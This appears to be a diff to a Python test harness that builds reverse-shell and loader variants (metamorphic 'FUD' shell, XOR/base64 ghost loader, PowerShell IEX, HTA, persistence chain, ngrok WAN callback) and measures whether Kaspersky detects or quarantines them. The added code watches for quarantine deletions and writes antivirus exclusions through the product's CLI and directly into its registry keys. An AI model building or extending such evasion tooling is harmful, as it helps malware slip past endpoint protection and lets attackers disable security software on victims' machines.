@@ -14,7 +14,14 @@ Usage:
 """
 
 import os, sys, socket, subprocess, threading, time, json, shutil
-import argparse, glob, winreg
+import argparse, glob, winreg, ctypes, ctypes.wintypes
+
+# ── Win32 constants for ReadDirectoryChangesW ──────────────────────────────
+FILE_NOTIFY_CHANGE_FILE_NAME  = 0x00000001
+FILE_NOTIFY_CHANGE_SIZE       = 0x00000008
+FILE_ACTION_REMOVED           = 0x00000002
+FILE_ACTION_RENAMED_OLD_NAME  = 0x00000004
+INVALID_HANDLE_VALUE          = ctypes.c_void_p(-1).value
 
 ROOT       = os.path.dirname(os.path.abspath(__file__))
 SHELL_DIR  = os.path.join(ROOT, "shell")
@@ -42,6 +49,169 @@ def hdr(m):
     hl("─")
 
 RESULTS = []   # (name, static, dynamic, notes)
+
+# ── Kaspersky file-deletion watcher ─────────────────────────────────────────
+
+class KavWatcher:
+    """
+    Watches a directory for files being deleted or renamed (quarantine move).
+    Uses ReadDirectoryChangesW so we catch Kaspersky's quarantine instantly.
+    """
+    def __init__(self, watch_dir):
+        self.watch_dir  = watch_dir
+        self.deleted    = []       # list of filenames killed by KAV
+        self._stop      = threading.Event()
+        self._thread    = None
+
+    def start(self):
+        self._thread = threading.Thread(target=self._watch, daemon=True)
+        self._thread.start()
+
+    def stop(self):
+        self._stop.set()
+
+    def was_deleted(self, filename):
+        base = os.path.basename(filename).lower()
+        return any(base == d.lower() for d in self.deleted)
+
+    def _watch(self):
+        k32 = ctypes.windll.kernel32
+        hDir = k32.CreateFileW(
+            self.watch_dir,
+            0x0001,           # FILE_LIST_DIRECTORY
+            0x07,             # FILE_SHARE_READ|WRITE|DELETE
+            None, 3,          # OPEN_EXISTING
+            0x02000000,       # FILE_FLAG_BACKUP_SEMANTICS
+            None
+        )
+        if hDir == INVALID_HANDLE_VALUE:
+            return
+
+        buf = ctypes.create_string_buffer(65536)
+        bytes_ret = ctypes.wintypes.DWORD(0)
+
+        while not self._stop.is_set():
+            ok_ret = k32.ReadDirectoryChangesW(
+                hDir, buf, len(buf), False,
+                FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE,
+                ctypes.byref(bytes_ret), None, None
+            )
+            if not ok_ret:
+                break
+            offset = 0
+            while True:
+                # FILE_NOTIFY_INFORMATION layout: NextEntryOffset(4), Action(4),
+                #                                 FileNameLength(4), FileName(variable)
+                next_off = ctypes.c_uint32.from_buffer_copy(buf, offset).value
+                action   = ctypes.c_uint32.from_buffer_copy(buf, offset + 4).value
+                fn_len   = ctypes.c_uint32.from_buffer_copy(buf, offset + 8).value
+                fn_raw   = buf.raw[offset + 12: offset + 12 + fn_len]
+                filename = fn_raw.decode("utf-16-le", errors="replace")
+
+                if action in (FILE_ACTION_REMOVED, FILE_ACTION_RENAMED_OLD_NAME):
+                    self.deleted.append(filename)
+                    print(f"\n  {RED}[KAV DELETED]{RST} {filename}")
+
+                if next_off == 0:
+                    break
+                offset += next_off
+
+        k32.CloseHandle(hDir)
+
+
+# ── Kaspersky exclusion setup ────────────────────────────────────────────────
+
+def kas_add_exclusion(kavs, path):
+    """
+    Try to add path to Kaspersky trusted zone via CLI.
+    Returns (success: bool, msg: str)
+    """
+    if not kavs:
+        return False, "no KAV found"
+    # Try CLI ADDEXCLUSION (supported in some versions)
+    try:
+        r = subprocess.run(
+            [kavs, "ADDEXCLUSION", f"/FILE:{path}", "/THREAT:*", "/ACTION:skip"],
+            capture_output=True, text=True, encoding="utf-8", errors="replace",
+            timeout=15, cwd=os.path.dirname(kavs)
+        )
+        if r.returncode == 0:
+            return True, "CLI exclusion added"
+        return False, f"CLI rc={r.returncode}: {(r.stdout+r.stderr).strip()[:120]}"
+    except Exception as e:
+        return False, str(e)
+
+def kas_exclusion_via_registry(path):
+    """
+    Write exclusion directly to Kaspersky's registry keys.
+    Kaspersky Self-Defense may block this — run as admin.
+    """
+    base_paths = [
+        r"SOFTWARE\KasperskyLab\AVP21.3\settings\ExcludedObjects",
+        r"SOFTWARE\KasperskyLab\AVP22.0\settings\ExcludedObjects",
+        r"SOFTWARE\WOW6432Node\KasperskyLab\AVP21.3\settings\ExcludedObjects",
+    ]
+    # Try to find the actual settings key
+    try:
+        root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\KasperskyLab")
+        products = []
+        for i in range(winreg.QueryInfoKey(root)[0]):
+            products.append(winreg.EnumKey(root, i))
+        winreg.CloseKey(root)
+    except:
+        return False, "KasperskyLab key not found"
+
+    for prod in products:
+        for suffix in [r"\settings\ExcludedObjects",
+                       r"\protected\AVP\settings\ExcludedObjects"]:
+            try:
+                key_path = rf"SOFTWARE\KasperskyLab\{prod}{suffix}"
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path,
+                                     0, winreg.KEY_SET_VALUE)
+                idx = winreg.QueryInfoKey(key)[1]
+                winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, path)
+                winreg.CloseKey(key)
+                return True, f"registry exclusion set: {key_path}"
+            except Exception as e:
+                continue
+    return False, "could not locate or write exclusion registry key (Self-Defense may be blocking)"
+
+
+def setup_kaspersky_exclusion(kavs, test_dir):
+    hdr("KASPERSKY EXCLUSION SETUP")
+    info(f"Adding exclusion for: {test_dir}")
+
+    # Method 1: CLI
+    ok_cli, msg_cli = kas_add_exclusion(kavs, test_dir)
+    if ok_cli:
+        ok(f"CLI: {msg_cli}")
+        return True
+    warn(f"CLI failed: {msg_cli}")
+
+    # Method 2: registry
+    ok_reg, msg_reg = kas_exclusion_via_registry(test_dir)
+    if ok_reg:
+        ok(f"Registry: {msg_reg}")
+        warn("Restart Kaspersky or reboot for registry exclusion to take effect")
+        return True
+    warn(f"Registry failed: {msg_reg}")
+
+    # Method 3: manual instructions
+    fail("Automated exclusion failed. Add it manually:")
+    print(f"""
+  {CYAN}Kaspersky manual exclusion steps:{RST}
+  1. Open Kaspersky → Settings (gear icon)
+  2. Security Settings → Threats and Exclusions
+  3. Manage Exclusions → Add
+  4. Add path: {test_dir}
+  5. Scope: All components
+  6. Status: Active → Save
+
+  Or temporarily PAUSE protection for testing:
+  Kaspersky tray icon → Pause Protection → 1 hour
+""")
+    return False
+
 
 # ── Kaspersky scanner ────────────────────────────────────────────────────────
 
@@ -323,7 +493,7 @@ def run_hta(path, timeout=25):
 
 # ── test runner ───────────────────────────────────────────────────────────────
 
-def test_variant(name, path, run_fn, kavs, static_only=False):
+def test_variant(name, path, run_fn, kavs, static_only=False, watcher=None):
     if not path or not os.path.exists(path):
         RESULTS.append((name, "BUILD FAIL", "N/A", "build error"))
         fail(f"{name}: build artifact missing")
@@ -331,10 +501,26 @@ def test_variant(name, path, run_fn, kavs, static_only=False):
 
     print(f"\n  {CYAN}[>>] {name}{RST}  {DIM}({os.path.basename(path)}){RST}")
 
+    # Check if KAV already deleted it before we even scanned
+    time.sleep(0.5)
+    if not os.path.exists(path):
+        fail(f"       KAV deleted file before scan (RTP on-write detection)")
+        RESULTS.append((name, "QUARANTINED", "N/A", "deleted on write by RTP"))
+        return
+
     # static scan
     static, sdetail = kas_scan(kavs, path)
-    label = {"CLEAN": f"{GREEN}CLEAN{RST}", "DETECTED": f"{RED}DETECTED{RST}",
-             "SKIP": f"{AMBER}NO KAV{RST}", "ERROR": f"{AMBER}ERROR{RST}"}
+
+    # Re-check: did KAV delete it during scan?
+    if not os.path.exists(path) or (watcher and watcher.was_deleted(path)):
+        fail(f"       KAV QUARANTINED during static scan")
+        RESULTS.append((name, "QUARANTINED", "N/A", "deleted during scan"))
+        return
+
+    label = {"CLEAN":    f"{GREEN}CLEAN{RST}",
+             "DETECTED": f"{RED}DETECTED{RST}",
+             "SKIP":     f"{AMBER}NO KAV{RST}",
+             "ERROR":    f"{AMBER}ERROR{RST}"}
     print(f"       Static : {label.get(static, static)}  {DIM}{sdetail[:80]}{RST}")
 
     if static_only:
@@ -348,6 +534,14 @@ def test_variant(name, path, run_fn, kavs, static_only=False):
         return
 
     dyn, dnote = run_fn(path)
+
+    # Post-run: did KAV kill it during execution?
+    if watcher and watcher.was_deleted(path):
+        fail(f"       KAV QUARANTINED during execution (System Watcher)")
+        static_label = static if static != "CLEAN" else "CLEAN"
+        RESULTS.append((name, static_label, "QUARANTINED@RUNTIME", "System Watcher triggered"))
+        return
+
     dlabel = f"{GREEN}CALLBACK{RST}" if dyn else f"{RED}NO CALLBACK{RST}"
     print(f"       Dynamic: {dlabel}  {DIM}{dnote[:80]}{RST}")
     RESULTS.append((name, static, "CALLBACK" if dyn else "NO CALLBACK", dnote[:60]))
@@ -390,9 +584,17 @@ def main():
     p.add_argument("--no-build",    action="store_true", help="Skip build, test existing test_builds/")
     p.add_argument("--static-only", action="store_true", help="Scan only — do not execute any binary")
     p.add_argument("--skip-ghost",  action="store_true", help="Skip ghost encoder variants")
+    p.add_argument("--setup",       action="store_true",
+                   help="Add test_builds/ to Kaspersky trusted zone and exit (run once on new machine)")
     ARGS = p.parse_args()
 
     os.makedirs(TEST_DIR, exist_ok=True)
+
+    # ── --setup mode: exclusion only ─────────────────────────────────────────
+    if ARGS.setup:
+        kavs = find_kaspersky()
+        setup_kaspersky_exclusion(kavs, TEST_DIR)
+        return
 
     print(f"\n  {BOLD}{RED}=== CHEYANNE EVASION TEST HARNESS ==={RST}")
     print(f"  {DIM}Kaspersky RTP expected active. Tests run on own hardware.{RST}")
@@ -444,41 +646,46 @@ def main():
     # ── 4. Test ───────────────────────────────────────────────────────────────
     hdr("STEP 4 — Static + Behavioral Tests")
 
+    # Start file deletion watcher — catches KAV quarantine events in real-time
+    watcher = KavWatcher(TEST_DIR)
+    watcher.start()
+    info("File deletion watcher active — will catch Kaspersky quarantine events")
+
     test_variant("Baseline Shell",
                  t_base,
                  lambda p: run_exe(p, ["127.0.0.1", str(port)]),
-                 kavs, ARGS.static_only)
+                 kavs, ARGS.static_only, watcher)
 
     test_variant("FUD Shell (metamorph)",
                  t_fud,
                  lambda p: run_exe(p, ["127.0.0.1", str(port)]),
-                 kavs, ARGS.static_only)
+                 kavs, ARGS.static_only, watcher)
 
     test_variant("Ghost Loader (XOR+b64)",
                  t_gl,
                  lambda p: run_exe(p),
-                 kavs, ARGS.static_only)
+                 kavs, ARGS.static_only, watcher)
 
     if not ARGS.skip_ghost:
         test_variant("Ghost PS1 (IEX)",
                      t_ps1,
                      lambda p: run_ps1(p),
-                     kavs, ARGS.static_only)
+                     kavs, ARGS.static_only, watcher)
 
         test_variant("Ghost PS1 (Assembly/.NET)",
                      t_asm,
                      lambda p: run_ps1(p),
-                     kavs, ARGS.static_only)
+                     kavs, ARGS.static_only, watcher)
 
         test_variant("VADER Chain (persist+shell)",
                      t_vader,
                      lambda p: run_ps1(p),
-                     kavs, ARGS.static_only)
+                     kavs, ARGS.static_only, watcher)
 
         test_variant("Ghost HTA (mshta delivery)",
                      t_hta,
                      lambda p: run_hta(p),
-                     kavs, ARGS.static_only)
+                     kavs, ARGS.static_only, watcher)
 
     # ── 5. WAN test (ngrok) ───────────────────────────────────────────────────
     if ngrok_h and not ARGS.static_only:
@@ -489,7 +696,9 @@ def main():
             test_variant("Ghost Loader (WAN/ngrok)",
                          t_gl_wan,
                          lambda p: run_exe(p),
-                         kavs, False)
+                         kavs, False, watcher)
+
+    watcher.stop()
 
     # ── Report ────────────────────────────────────────────────────────────────
     report()
